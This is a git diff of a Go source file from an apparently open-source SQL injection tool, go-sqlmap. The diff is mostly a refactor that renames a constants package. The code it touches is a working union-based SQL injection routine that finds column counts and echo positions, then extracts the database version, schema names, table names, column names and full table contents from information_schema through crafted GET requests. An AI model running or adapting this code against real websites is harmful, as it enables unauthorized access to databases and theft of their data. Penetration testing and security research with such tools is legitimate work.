@@ -2,8 +2,8 @@ package line
 
 import (
 	"bytes"
+	"github.com/EmYiQing/go-sqlmap/constant"
 	"github.com/EmYiQing/go-sqlmap/log"
-	"github.com/EmYiQing/go-sqlmap/str"
 	"github.com/EmYiQing/go-sqlmap/util"
 	"math/rand"
 	"strconv"
@@ -19,13 +19,13 @@ func GetOrderByNum(suffixList []string, url string) (string, int) {
 			if i > 100 {
 				return "", 0
 			}
-			payload := url + suffix + str.Space + str.UnionSelectOrderPayload +
-				str.Space + strconv.Itoa(i) + str.Space + str.Annotator
-			code, _, body := util.Request(str.RequestMethod, payload, nil, nil)
+			payload := url + suffix + constant.Space + constant.UnionSelectOrderPayload +
+				constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
+			code, _, body := util.Request(constant.RequestMethod, payload, nil, nil)
 			if code != -1 {
 				// 得到最终正确的闭合符号
 				if strings.Contains(strings.ToLower(string(body)),
-					strings.ToLower(str.OrderKeyword)) {
+					strings.ToLower(constant.OrderKeyword)) {
 					return suffix, i
 				}
 			}
@@ -35,10 +35,10 @@ func GetOrderByNum(suffixList []string, url string) (string, int) {
 
 // GetUnionSelectPos 根据得到的列数得到页面回显索引
 func GetUnionSelectPos(suffix string, url string, key int) Pos {
-	url = url + str.UnionSelectUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	unionSql := bytes.Buffer{}
-	unionSql.WriteString(url + suffix + str.Space +
-		str.UnionSelectUnionSql + str.Space)
+	unionSql.WriteString(url + suffix + constant.Space +
+		constant.UnionSelectUnionSql + constant.Space)
 	// 设置随机数（唯一ID）
 	// randMap是UnionSelect序号和随机数的对应关系
 	// 为了后续可以根据回显随机数确认需要并替换为Payload
@@ -46,13 +46,13 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 	for i := 1; i < key; i++ {
 		// 每次根据当前时间生成，确保唯一
 		rand.Seed(time.Now().UnixNano())
-		x := rand.Intn(str.DefaultRandomRange)
+		x := rand.Intn(constant.DefaultRandomRange)
 		randMap[i] = x
 		unionSql.WriteString(strconv.Itoa(x) + ",")
 	}
 	res := util.DeleteLastChar(unionSql.String())
-	unionPayload := res + str.Space + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, unionPayload, nil, nil)
+	unionPayload := res + constant.Space + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, unionPayload, nil, nil)
 	pos := Pos{}
 	var tempPosList []Pos
 	if code != -1 {
@@ -82,16 +82,16 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 
 // GetVersion 根据已有的条件得到数据库版本信息
 func GetVersion(pos Pos, suffix string, url string, key int) string {
-	url = url + str.UnionSelectUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	versionSql := bytes.Buffer{}
-	versionSql.WriteString(url + suffix + str.Space +
-		str.UnionSelectUnionSql + str.Space)
+	versionSql.WriteString(url + suffix + constant.Space +
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
-		versionSql.WriteString(str.VersionFunc + ",")
+		versionSql.WriteString(constant.VersionFunc + ",")
 	}
 	res := util.DeleteLastChar(versionSql.String())
-	versionPayload := res + str.Space + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, versionPayload, nil, nil)
+	versionPayload := res + constant.Space + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, versionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		// 获得随机数开始索引处往后的部分
@@ -106,16 +106,16 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 
 // GetCurrentDatabase 根据已有的条件得到当前数据库名
 func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
-	url = url + str.UnionSelectUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	databaseSql := bytes.Buffer{}
-	databaseSql.WriteString(url + suffix + str.Space +
-		str.UnionSelectUnionSql + str.Space)
+	databaseSql.WriteString(url + suffix + constant.Space +
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
-		databaseSql.WriteString(str.DatabaseFunc + ",")
+		databaseSql.WriteString(constant.DatabaseFunc + ",")
 	}
 	res := util.DeleteLastChar(databaseSql.String())
-	databasePayload := res + str.Space + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, databasePayload, nil, nil)
+	databasePayload := res + constant.Space + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, databasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		// 获得随机数开始索引处往后的部分
@@ -130,17 +130,17 @@ func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
 
 // GetAllDatabases 根据已有的信息得到所有的数据库名
 func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
-	url = url + str.UnionSelectUnionCondition
-	database := str.UnionSelectUnionSql
+	url = url + constant.UnionSelectUnionCondition
+	database := constant.UnionSelectUnionSql
 	databaseSql := bytes.Buffer{}
-	databaseSql.WriteString(url + suffix + str.Space + database + str.Space)
+	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
 	for i := 1; i < key; i++ {
 		databaseSql.WriteString("group_concat(schema_name),")
 	}
 	res := util.DeleteLastChar(databaseSql.String())
 	fromSql := "from%20information_schema.schemata%20"
-	tablePayload := res + str.Space + fromSql + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, tablePayload, nil, nil)
+	tablePayload := res + constant.Space + fromSql + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		// 获得随机数开始索引处往后的部分
@@ -156,16 +156,16 @@ func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
 
 // GetAllTables 根据已有的信息得到某数据库中所有的表
 func GetAllTables(pos Pos, suffix string, url string, key int, database string) string {
-	url = url + str.UnionSelectUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	tableSql := bytes.Buffer{}
-	tableSql.WriteString(url + suffix + str.Space + str.UnionSelectUnionSql + str.Space)
+	tableSql.WriteString(url + suffix + constant.Space + constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		tableSql.WriteString("group_concat(table_name),")
 	}
 	res := util.DeleteLastChar(tableSql.String())
 	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
-	tablePayload := res + str.Space + fromSql + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, tablePayload, nil, nil)
+	tablePayload := res + constant.Space + fromSql + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		// 获得随机数开始索引处往后的部分
@@ -181,18 +181,18 @@ func GetAllTables(pos Pos, suffix string, url string, key int, database string) 
 
 // GetColumns 根据已有的信息得到某表中的所有字段名
 func GetColumns(pos Pos, suffix string, url string, key int, database string, tableName string) string {
-	url = url + str.UnionSelectUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	columnSql := bytes.Buffer{}
-	columnSql.WriteString(url + suffix + str.Space +
-		str.UnionSelectUnionSql + str.Space)
+	columnSql.WriteString(url + suffix + constant.Space +
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		columnSql.WriteString("group_concat(column_name),")
 	}
 	res := util.DeleteLastChar(columnSql.String())
 	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
 		"'%20and%20table_schema='" + database + "'%20"
-	columnPayload := res + str.Space + fromSql + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, columnPayload, nil, nil)
+	columnPayload := res + constant.Space + fromSql + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		// 获得随机数开始索引处往后的部分
@@ -208,10 +208,10 @@ func GetColumns(pos Pos, suffix string, url string, key int, database string, ta
 
 // GetData 根据已有的信息得到某表所有数据
 func GetData(pos Pos, suffix string, url string, key int, database string, tableName string, columns []string) {
-	url = url + str.UnionSelectUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	dataSql := bytes.Buffer{}
-	dataSql.WriteString(url + suffix + str.Space +
-		str.UnionSelectUnionSql + str.Space)
+	dataSql.WriteString(url + suffix + constant.Space +
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		prefix := "group_concat("
 		for _, v := range columns {
@@ -224,8 +224,8 @@ func GetData(pos Pos, suffix string, url string, key int, database string, table
 	}
 	res := util.DeleteLastChar(dataSql.String())
 	fromSql := "from%20" + database + "." + tableName
-	columnPayload := res + str.Space + fromSql + str.Annotator
-	code, _, tempBody := util.Request(str.RequestMethod, columnPayload, nil, nil)
+	columnPayload := res + constant.Space + fromSql + constant.Annotator
+	code, _, tempBody := util.Request(constant.RequestMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		// 获得随机数开始索引处往后的部分
